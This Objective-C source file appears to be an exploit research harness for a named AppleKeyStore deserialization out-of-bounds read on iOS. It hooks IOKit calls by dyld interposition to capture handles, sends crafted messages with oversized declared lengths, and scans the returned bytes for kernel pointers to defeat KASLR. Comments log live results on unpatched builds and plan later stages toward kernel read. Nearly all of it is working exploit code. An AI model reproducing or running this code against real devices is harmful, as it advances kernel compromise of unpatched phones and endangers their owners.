//
//  P057AksDeserialize.m
//  P007OpenOnly
//
//  CVE-2026-65343 — AppleKeyStore ACM deserialize OOB read (KASLR).
//  Fixed 26.6.1 / 23G83. LIVE on 23F77 and 23G71.
//  Credits: Drinor Selmanaj (Sentry), Surya Narayan Kushwaha.
//  Layout from ByteV0rtex poc_aks_oob.m: handle[16], cmd_type u32,
//  cmd_size u32, declared_length u32 at +24.
//
//  23F77 Ghidra name is LibSer_ACMDeserializeSEPControlCode
//  (FUN_fffffff008d5cc80), ACM min size 0x18. Copyout that trusts
//  declared_length lives in AppleKeyStore, not that parse helper.
//
//  Live v4 (Lum1na aks-capture-v4, 2026-10-02): se_ok=YES hook_n=0
//  capture_done=0. type0+1 OPEN. sel0/1 kr=0 empty. sel2-4,6-7 2c2.
//  sel5 2c1 NotPrivileged. kptrs=0. v4 already sent declared=0x800
//  at +24 insz=28 on sel0-7 with a zero handle.
//
//  This TAP: interposition self-test, sel0/1 hex dump, declared
//  0x28 then 0x100 on sel 0 and 1 only. STOP. No 163-sel. No sel5.
//  No 0x800 (parked after the crash sweep). Not hasKread.

#import "P057AksDeserialize.h"
#import "P007Board.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <string.h>
#import <mach/mach.h>

#define P057_BUILD @"aks-p007-v5-sel01-hex"
#define SE_KEY_TAG "com.research.p007.aks.v5"
#define OUTBUF_SZ  0x400u
#define FILL_BYTE  0xBBu
#define MSG_SZ     28u

#ifndef DYLD_INTERPOSE
#define DYLD_INTERPOSE(_replacement, _replacee)                          \
    __attribute__((used))                                                 \
    static struct { const void *replacement; const void *replacee; }     \
    _interpose_##_replacee                                                \
    __attribute__((section("__DATA,__interpose"))) = {                   \
        (const void *)(unsigned long)&(_replacement),                    \
        (const void *)(unsigned long)&(_replacee)                        \
    };
#endif

typedef kern_return_t (*IOConnectCallMethod_fn)(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef kern_return_t (*IOConnectCallStructMethod_fn)(
    io_connect_t, uint32_t,
    const void *, size_t,
    void *, size_t *);

static volatile int          g_armed = 0;
static volatile long         g_hook_n = 0;
static volatile int          g_cap_done = 0;
static volatile io_connect_t g_cap_conn = 0;
static volatile uint32_t     g_cap_sel = 0;
static uint8_t               g_cap_handle[16];
static IOConnectCallMethod_fn       g_real_iocm = NULL;
static IOConnectCallStructMethod_fn g_real_iocsm = NULL;
static volatile BOOL         g_running = NO;

static kern_return_t my_IOConnectCallMethod(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
static kern_return_t my_IOConnectCallStructMethod(
    io_connect_t, uint32_t,
    const void *, size_t,
    void *, size_t *);

static void p057_resolve(void) {
    if (!g_real_iocm) {
        g_real_iocm = (IOConnectCallMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
        if (g_real_iocm == my_IOConnectCallMethod) g_real_iocm = NULL;
    }
    if (!g_real_iocsm) {
        g_real_iocsm = (IOConnectCallStructMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallStructMethod");
        if (g_real_iocsm == my_IOConnectCallStructMethod) g_real_iocsm = NULL;
    }
}

__attribute__((constructor))
static void p057_init(void) {
    p057_resolve();
}

static kern_return_t real_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    p057_resolve();
    if (!g_real_iocm) return KERN_FAILURE;
    return g_real_iocm(conn, sel, scalin, scalin_cnt,
                       structin, structin_sz,
                       scalout, scalout_cnt,
                       structout, structout_sz);
}

static void p057_maybe_capture(io_connect_t conn, uint32_t sel,
                              const void *structin, size_t structin_sz)
{
    g_hook_n++;
    if (!g_armed || g_cap_done) return;
    if (!structin || structin_sz < 16) return;
    const uint8_t *h = (const uint8_t *)structin;
    int nz = 0;
    for (int k = 0; k < 16; k++) if (h[k]) { nz = 1; break; }
    if (!nz) return;
    g_cap_conn = conn;
    g_cap_sel = sel;
    memcpy(g_cap_handle, h, 16);
    __asm__ __volatile__("dmb ish" ::: "memory");
    g_cap_done = 1;
}

static kern_return_t my_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    if (g_armed)
        p057_maybe_capture(conn, sel, structin, structin_sz);
    return real_IOConnectCallMethod(conn, sel, scalin, scalin_cnt,
                                    structin, structin_sz,
                                    scalout, scalout_cnt,
                                    structout, structout_sz);
}

static kern_return_t real_IOConnectCallStructMethod(
    io_connect_t conn, uint32_t sel,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz)
{
    p057_resolve();
    if (!g_real_iocsm) return KERN_FAILURE;
    return g_real_iocsm(conn, sel, structin, structin_sz, structout, structout_sz);
}

static kern_return_t my_IOConnectCallStructMethod(
    io_connect_t conn, uint32_t sel,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz)
{
    if (g_armed)
        p057_maybe_capture(conn, sel, structin, structin_sz);
    return real_IOConnectCallStructMethod(conn, sel, structin, structin_sz,
                                          structout, structout_sz);
}

DYLD_INTERPOSE(my_IOConnectCallMethod, IOConnectCallMethod)
DYLD_INTERPOSE(my_IOConnectCallStructMethod, IOConnectCallStructMethod)

static NSMutableString *p057_buf = nil;

static void p057_write_log(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"p057_aks_deserialize_log.txt"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = p057_buf.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
}

static void p057_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [p057_buf appendString:out];
    NSLog(@"p057 %@", line);
}

static const char *p057_krn(kern_return_t kr) {
    uint32_t u = (uint32_t)kr;
    if (u == 0) return "SUCCESS";
    if (u == 0xe00002c1) return "NotPrivileged";
    if (u == 0xe00002c2) return "BadArgument";
    if (u == 0xe00002c7) return "Unsupported";
    if (u == 0xe00002d5) return "Busy";
    if (u == 0xe00002e2) return "NotPermitted";
    return "?";
}

static int p057_looks_kptr(uint64_t v) {
    if ((v >> 32) == 0xfffffff0u && (v & 0xffffffffULL) != 0) return 1;
    if (v >= 0xFFFFFFE000000000ULL && v <= 0xFFFFFFE3FFFFFFFFULL) return 1;
    return 0;
}

static BOOL p057_trigger_se(void) {
    NSData *tag = [NSData dataWithBytes:SE_KEY_TAG length:strlen(SE_KEY_TAG)];
    NSDictionary *delQ = @{ (id)kSecClass: (id)kSecClassKey,
                            (id)kSecAttrApplicationTag: tag };
    SecItemDelete((__bridge CFDictionaryRef)delQ);

    CFErrorRef err = NULL;
    SecAccessControlRef acl = SecAccessControlCreateWithFlags(
        kCFAllocatorDefault, kSecAttrAccessibleAfterFirstUnlock, 0, &err);
    if (!acl) {
        p057_log(@"[se] ACL failed");
        if (err) CFRelease(err);
        return NO;
    }

    NSDictionary *attrs = @{
        (id)kSecAttrKeyType:       (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @256,
        (id)kSecAttrTokenID:       (id)kSecAttrTokenIDSecureEnclave,
        (id)kSecAttrAccessControl: (__bridge id)acl,
        (id)kSecPrivateKeyAttrs: @{
            (id)kSecAttrIsPermanent: @YES,
            (id)kSecAttrApplicationTag: tag,
        },
    };
    err = NULL;
    SecKeyRef key = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &err);
    CFRelease(acl);
    if (!key) {
        p057_log(@"[se] key create failed: %@",
                 err ? [(__bridge NSError *)err description] : @"?");
        if (err) CFRelease(err);
        return NO;
    }

    const uint8_t msg[32] = {0xDE, 0xAD, 0xBE, 0xEF};
    CFDataRef msgRef = CFDataCreate(NULL, msg, sizeof(msg));
    err = NULL;
    CFDataRef sig = SecKeyCreateSignature(
        key, kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &err);
    CFRelease(msgRef);
    CFRelease(key);
    BOOL ok = (sig != NULL);
    if (sig) CFRelease(sig);
    if (err) CFRelease(err);
    p057_log(@"[se] sign %@", ok ? @"OK" : @"failed");
    return ok;
}

static void p057_cleanup_se(void) {
    NSData *tag = [NSData dataWithBytes:SE_KEY_TAG length:strlen(SE_KEY_TAG)];
    NSDictionary *delQ = @{ (id)kSecClass: (id)kSecClassKey,
                            (id)kSecAttrApplicationTag: tag };
    SecItemDelete((__bridge CFDictionaryRef)delQ);
}

/* sel 0 or 1 only. declared is the u32 at +24. Never 0x400/0x800. */
static int p057_probe(io_connect_t conn, const uint8_t *handle16,
                     int sel, uint32_t declared)
{
    if (sel < 0 || sel > 1) return 0;
    if (declared > 0x100) return 0;

    uint8_t msg[MSG_SZ];
    memset(msg, 0, sizeof(msg));
    if (handle16) memcpy(msg, handle16, 16);
    uint32_t decl = declared;
    memcpy(msg + 24, &decl, 4);

    uint8_t outbuf[OUTBUF_SZ];
    memset(outbuf, FILL_BYTE, sizeof(outbuf));
    size_t outsz = sizeof(outbuf);
    uint64_t scalo[8] = {0};
    uint32_t scaln = 8;

    kern_return_t kr = real_IOConnectCallMethod(
        conn, (uint32_t)sel,
        NULL, 0, msg, sizeof(msg),
        scalo, &scaln, outbuf, &outsz);

    int nonfill = 0;
    for (size_t i = 0; i < sizeof(outbuf); i++)
        if (outbuf[i] != FILL_BYTE) nonfill++;

    p057_log(@"  sel=%d decl=0x%x kr=0x%08x (%s) outsz=%zu nonfill=%d scaln=%u sc0=0x%llx",
             sel, declared, kr, p057_krn(kr), outsz, nonfill, scaln,
             scaln ? scalo[0] : 0ULL);

    size_t hexn = outsz;
    if (hexn > 64) hexn = 64;
    if (hexn > sizeof(outbuf)) hexn = sizeof(outbuf);
    if (nonfill > 0 || (kr == KERN_SUCCESS && outsz > 0 && outsz != sizeof(outbuf))) {
        NSMutableString *hex = [NSMutableString string];
        for (size_t i = 0; i < hexn; i++)
            [hex appendFormat:@"%02x", outbuf[i]];
        p057_log(@"    hex[%zu]: %@", hexn, hex);
    }

    int found = 0;
    size_t scan = outsz < sizeof(outbuf) ? outsz : sizeof(outbuf);
    for (size_t i = 0; i + 8 <= scan; i += 8) {
        uint64_t v = 0;
        memcpy(&v, outbuf + i, 8);
        if (!p057_looks_kptr(v)) continue;
        found++;
        p057_log(@"  *** KPTR sel=%d decl=0x%x @+0x%04zx = 0x%016llx ***",
                 sel, declared, i, (unsigned long long)v);
        p057_log(@"      KASLR candidate only. Not hasKread. Not commitSlide.");
        [[P007Board shared] recordCandidate:v kind:@"kaslr" source:@"p057"];
    }
    return found;
}

@implementation P057AksDeserialize

+ (NSString *)tap {
    @synchronized ([P057AksDeserialize class]) {
        if (g_running) return @"p057 already running — one tap at a time";
        g_running = YES;
    }

    p057_buf = [NSMutableString string];
    p057_log(@"=== p057 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P057_BUILD);
    p057_log(@"CVE-2026-65343 AKS ACM deserialize OOB read. KASLR, not KRW, not kreadbuf.");
    p057_log(@"Fixed 26.6.1 → LIVE on 23F77 / 23G71.");
    p057_log(@"Ghidra: LibSer_ACMDeserializeSEPControlCode @ fffffff008d5cc80 (ACM min 0x18).");
    p057_log(@"v4 already sent declared=0x800 +24 insz=28 on sel0-7 zero-handle; kptrs=0.");
    p057_log(@"This TAP: hook self-test + sel0/1 hex + decl 0x28 then 0x100. No 163. No sel5. No 0x800.");
    p057_log(@"");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p057"];
    if (stop) {
        p057_log(@"%@", stop);
        p057_write_log();
        @synchronized ([P057AksDeserialize class]) { g_running = NO; }
        return p057_buf;
    }
    p057_log(@"%@", [LabDeviceProfile identBlock]);
    p057_write_log();

    p057_resolve();
    p057_log(@"[hook] real IOConnectCallMethod=%p CallStructMethod=%p",
             g_real_iocm, g_real_iocsm);

    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
    if (!svc) {
        p057_log(@"[-] AppleKeyStore not found");
        p057_write_log();
        @synchronized ([P057AksDeserialize class]) { g_running = NO; }
        return p057_buf;
    }

    io_connect_t opened[2] = {0, 0};
    uint32_t nopened = 0;
    static const uint32_t kTypes[] = { 0, 1 };
    for (uint32_t t = 0; t < 2; t++) {
        io_connect_t cnx = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), kTypes[t], &cnx);
        p057_log(@"[+] IOServiceOpen type=%u kr=0x%x conn=%u", kTypes[t], kr, cnx);
        if (kr == KERN_SUCCESS && cnx) opened[nopened++] = cnx;
    }
    IOObjectRelease(svc);
    if (nopened == 0) {
        p057_log(@"[-] AKS open failed both types");
        p057_write_log();
        @synchronized ([P057AksDeserialize class]) { g_running = NO; }
        return p057_buf;
    }
    io_connect_t conn = opened[0];

    /* Phase 1: interposition self-test on OUR imported symbol. */
    g_armed = 1;
    g_hook_n = 0;
    g_cap_done = 0;
    g_cap_conn = 0;
    g_cap_sel = 0;
    memset(g_cap_handle, 0, sizeof(g_cap_handle));
    __asm__ __volatile__("dmb ish" ::: "memory");

    uint8_t probeMsg[MSG_SZ];
    memset(probeMsg, 0, sizeof(probeMsg));
    uint8_t ob[0x40];
    memset(ob, 0, sizeof(ob));
    size_t osz = sizeof(ob);
    uint64_t sc[4] = {0};
    uint32_t scn = 4;
    IOConnectCallMethod(conn, 0, NULL, 0, probeMsg, sizeof(probeMsg),
                        sc, &scn, ob, &osz);
    long self_n = g_hook_n;
    g_armed = 0;
    p057_log(@"[hook] self-test hook_n=%ld (1=interpose ALIVE on this UC; 0=dyld4 never routed)",
             self_n);

    /* Phase 2: SE sign with hook armed. v4: se_ok=YES, hook_n=0 (secd XPC). */
    g_hook_n = 0;
    g_cap_done = 0;
    g_armed = 1;
    __asm__ __volatile__("dmb ish" ::: "memory");
    BOOL seOk = p057_trigger_se();
    __asm__ __volatile__("dmb ish" ::: "memory");
    g_armed = 0;
    p057_log(@"[hook] during SE: se_ok=%@ hook_n=%ld captured=%d cap_sel=%u",
             seOk ? @"YES" : @"NO", g_hook_n, g_cap_done, g_cap_sel);

    uint8_t handle[16];
    memset(handle, 0, 16);
    BOOL haveHandle = NO;
    int probeSel0 = 0;
    int probeSel1 = 1;
    if (g_cap_done && g_cap_conn) {
        memcpy(handle, g_cap_handle, 16);
        haveHandle = YES;
        p057_log(@"[+] ACM captured conn=%u sel=%u — using real handle on sel 0/1 only",
                 g_cap_conn, g_cap_sel);
        if (g_cap_sel <= 1) {
            probeSel0 = (int)g_cap_sel;
            probeSel1 = probeSel0;
        }
        conn = g_cap_conn;
    } else {
        p057_log(@"[*] no in-process ACM (secd XPC or interpose miss). Synthetic on our UC.");
        p057_log(@"    ByteV0rtex 163-sel zero-handle 0x800 sweep stays PARKED (crash).");
    }
    p057_write_log();

    /* Phase 3: sel0/1 hex dump + declared 0x28 then 0x100. */
    p057_log(@"");
    p057_log(@"[3] sel 0/1 hex dump. declared 0x28 then 0x100. STOP after.");
    int totalKptr = 0;
    static const uint32_t decls[] = { 0x28, 0x100 };
    int sels[2] = { probeSel0, probeSel1 };
    int nsels = (probeSel0 == probeSel1) ? 1 : 2;
    for (int si = 0; si < nsels; si++) {
        for (uint32_t di = 0; di < 2; di++) {
            totalKptr += p057_probe(conn, haveHandle ? handle : NULL,
                                    sels[si], decls[di]);
        }
    }
    p057_log(@"[3] done kptrs=%d handle=%@",
             totalKptr, haveHandle ? @"real" : @"zero");
    if (totalKptr > 0) {
        p057_log(@"*** copyout produced kernel-range qwords. KASLR sibling of aio84530.");
        p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
        p057_log(@"NEXT: paste hex; 0x800 on THIS selector only after you authorize.");
    } else {
        p057_log(@"No kptrs on sel0/1 at decl<=0x100. Matches v4 empty kr=0.");
        p057_log(@"sel0/1 accepting our 28-byte shape is not proof they are deserialize.");
        p057_log(@"Need ACM created on THIS AppleKeyStore conn, then deserialize.");
        p057_log(@"Do not size-sweep sel5 (2c1 privilege). Do not 163-sel. Do not 0x800.");
    }

    for (uint32_t i = 0; i < nopened; i++) {
        if (opened[i] && opened[i] != g_cap_conn) IOServiceClose(opened[i]);
    }
    p057_cleanup_se();

    p057_log(@"");
    p057_log(@"=== END p057 (%@) ===", [P007Board shared].kreadSignal);
    p057_write_log();
    @synchronized ([P057AksDeserialize class]) { g_running = NO; }
    return p057_buf;
}

@end
